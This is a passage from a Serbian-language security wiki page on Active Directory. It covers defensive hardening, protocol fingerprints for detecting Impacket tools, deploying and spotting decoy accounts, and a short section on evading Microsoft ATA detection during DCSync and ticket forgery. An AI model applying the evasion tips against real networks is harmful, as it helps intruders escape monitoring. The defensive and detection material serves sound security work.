- **Ograničenja za Domain Admins**: Preporučuje se da Domain Admins mogu da se prijavljuju samo na Domain Controllers, kako bi se izbegla njihova upotreba na drugim hostovima.
- **Privileges servisnih naloga**: Servisi ne bi trebalo da se pokreću sa Domain Admin (DA) privilegijama radi očuvanja bezbednosti.
- **Vremensko ograničavanje privilegija**: Za zadatke koji zahtevaju DA privilegije, njihovo trajanje treba ograničiti. To se može postići pomoću: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Ublažavanje LDAP relay-a**: Revidirajte Event ID-ove 2889/3074/3075, a zatim nametnite LDAP signing i LDAPS channel binding na DC-ovima/klijentima kako biste blokirali LDAP MITM/relay pokušaje.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting of Impacket activity

Ako želite da otkrijete uobičajeni AD tradecraft, **nemojte se oslanjati samo na artefakte pod kontrolom operatora**, kao što su preimenovani binarni fajlovi, nazivi servisa, privremeni batch fajlovi ili output putanje. Napravite baseline načina na koji legitimni Windows klijenti generišu [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC i WMI saobraćaj, a zatim tražite **implementation quirks** koji ostaju čak i nakon što operator izmeni `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` ili `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Standalone kandidati sa visokom pouzdanošću** (nakon provere u odnosu na sopstveni baseline):
- Autentifikovani DCE/RPC sa `auth_context_id = 79231 + ctx_id`
- DCE/RPC authentication padding popunjen vrednošću `0xff`
- LDAP Kerberos bind-ovi koji postavljaju sirovi Kerberos `AP-REQ` direktno u SPNEGO `mechToken`
- SMB2/3 negotiate zahtevi sa ASCII-vrednostima `ClientGuid`
- WMI `IWbemLevel1Login::NTLMLogin` koji koristi nestandardni namespace `//./root/cimv2`
- Hardkodovane Kerberos nonce vrednosti
- **Bolje kao correlation/scoring features**:
- Sparse ili duplirane Kerberos etype liste, neuobičajeni/nedostajući `PA-DATA` ili redosled TGS-REQ etype vrednosti koji se razlikuje od nativnog Windows-a
- NTLM Type 1 poruke bez informacija o verziji ili Type 3 poruke sa null nazivima hostova
- Sirovi NTLMSSP prenet u DCE/RPC umesto u SPNEGO, nedostajući DCE/RPC verification trailers ili nepodudaranja SPNEGO/Kerberos OID-ova
- Više ovih osobina sa istog hosta/korisnika/sesije/vremenskog intervala mnogo je snažnije od bilo kog pojedinačnog slabog polja
- **Koristite kao enrichment, a ne kao standalone alerts**:
- Podrazumevani nazivi fajlova, output putanje, nasumični nazivi servisa, privremeni nazivi batch fajlova, podrazumevani nazivi computer account-a i tool-specific HTTP/WebDAV/RDP/MSSQL strings
- Operatorima ih je lako promeniti i najbolje ih je koristiti za objašnjenje zašto je cross-protocol cluster sumnjiv
- **Operational notes**:
- Neki od ovih signala zahtevaju dekriptovan saobraćaj, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW ili vidljivost na strani servisa
- Proverite ih u odnosu na Samba/Linux klijente, appliance uređaje i legacy software pre nego što ih promovišete u alerts
- Promovišite detections od enrichment-a -> hunting-a -> alerting-a kako povećavate pouzdanost baseline-a

### **Implementing Deception Techniques**

- Implementiranje deception-a podrazumeva postavljanje zamki, kao što su decoy korisnici ili računari, sa osobinama poput lozinki koje ne ističu ili oznake Trusted for Delegation. Detaljan pristup obuhvata kreiranje korisnika sa određenim pravima ili njihovo dodavanje u grupe sa visokim privilegijama.<sup>[[2]](#references)</sup>
- Praktičan primer podrazumeva korišćenje alata kao što su: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Više informacija o implementiranju deception tehnika možete pronaći na [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **Za User Objects**: Sumnjivi indikatori obuhvataju neuobičajeni ObjectSID, retke logon-e, datume kreiranja i mali broj pogrešnih lozinki.
- **Opšti indikatori**: Poređenje atributa potencijalnih decoy objekata sa atributima legitimnih objekata može otkriti nedoslednosti. Alati poput [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogu pomoći u otkrivanju ovakvih deception-a.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **Enumeracija korisnika**: Izbegavanje enumeracije sesija na Domain Controllers kako bi se sprečila ATA detekcija.
- **Impersonation ticket-a**: Korišćenje **aes** ključeva za kreiranje ticket-a pomaže u izbegavanju detekcije jer se ne vrši downgrade na NTLM.
- **DCSync napadi**: Preporučuje se izvršavanje sa računara koji nije Domain Controller, kako bi se izbegla ATA detekcija, pošto će direktno izvršavanje sa Domain Controller-a aktivirati alerts.

## References

- [1] [Vodič za napad na domain trust-ove](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Kovanje trust-ova radi deception-a u Active Directory-ju](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Od Domain Admin-a do Enterprise Admin-a](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – In-Memory LDAP Toolkit za Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Preuzimanje kontrole nad Active Directory nalozima putem Netlogon-a](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Kako upravljati promenama na Netlogon secure channel konekcijama povezanim sa CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Putovanje kroz zaboravljene Null Session i MS-RPC interfejse](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter kao bezbednosna granica između domena? (Deo 4) - Istraživanje zaobilaženja SID filtering-a](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter kao bezbednosna granica između domena? (Deo 5) - Golden GMSA trust attack - od child do parent domena](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter kao bezbednosna granica između domena? (Deo 6) - Schema change trust attack - od child do parent domena](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Od DA do EA sa ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Eskalacija od administratora child domena do enterprise administratora za 5 minuta zloupotrebom AD CS-a, nastavak](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [ACE u rukavu: Dizajniranje Active Directory DACL backdoor-a](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [NetExec pre2k module source](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - atribut msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
